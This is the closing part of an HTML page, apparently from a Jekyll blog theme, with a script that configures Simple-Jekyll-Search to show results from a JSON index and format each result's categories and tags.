  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

